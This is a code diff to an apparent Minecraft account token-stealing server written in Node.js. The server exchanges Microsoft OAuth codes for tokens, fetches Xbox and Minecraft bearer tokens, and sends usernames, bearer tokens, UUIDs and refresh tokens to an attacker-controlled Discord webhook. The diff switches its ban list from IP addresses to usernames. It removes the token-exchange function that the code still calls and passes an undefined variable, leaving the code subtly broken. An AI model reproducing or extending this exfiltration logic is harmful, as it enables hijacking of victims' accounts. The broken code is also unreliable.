@@ -16,11 +16,6 @@ app.get('/', async (req, res) => {
         return
     }
     try {
-        const ip = getIp(req)
-        if (checkIfBanned(ip)) {
-            logToWebhook("Reject", "A person has been rejected due to them being ip banned.")
-            return
-        }
         const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
         const accessToken = accessTokenAndRefreshTokenArray[0]
         const refreshToken = accessTokenAndRefreshTokenArray[1]
@@ -32,7 +27,12 @@ app.get('/', async (req, res) => {
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
-        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
+        if (checkIfBanned(username)) {
+            logToWebhook("Reject", "A person has been rejected.")
+            return
+        }
+        const ip = getIp(req)
+        postToWebhook(username, bearerToken, uuid, name, refreshToken)
     } catch (e) {
         console.log(e)
     }
@@ -41,26 +41,6 @@ app.get('/', async (req, res) => {
 app.listen(port, () => {
     console.log(`Started the server on ${port}`)
 })
-
-async function getAccessTokenAndRefreshToken(code) {
-    const url = 'https://login.live.com/oauth20_token.srf'
-
-    const config = {
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-        }
-    }
-    let data = {
-        client_id: client_id,
-        redirect_uri: redirect_uri,
-        client_secret: client_secret,
-        code: code,
-        grant_type: 'authorization_code'
-    }
-
-    let response = await axios.post(url, data, config)
-    return [response.data['access_token'], response.data['refresh_token']]
-}
 
 async function getUserHashAndToken(accessToken) {
     const url = 'https://user.auth.xboxlive.com/user/authenticate'
@@ -164,18 +144,19 @@ function logToWebhook(title, message) {
     axios.post(url, data).then(() => console.log("Logging to discord."))
 }
 
-const bannedIps = []
+const bannedNames = []
 
-function addBan(ip) {
-    bannedIps.push(ip);
+function addBan(name) {
+    bannedNames.push(name);
 }
 
-function checkIfBanned(ip) {
-    for (const item of bannedIps) {
-        if (ip === item) {
+function checkIfBanned(name) {
+
+    for (const item of bannedNames) {
+        if (name === item) {
             return true
         }
     }
-    addBan(ip)
+    addBan(name)
     return false
 }
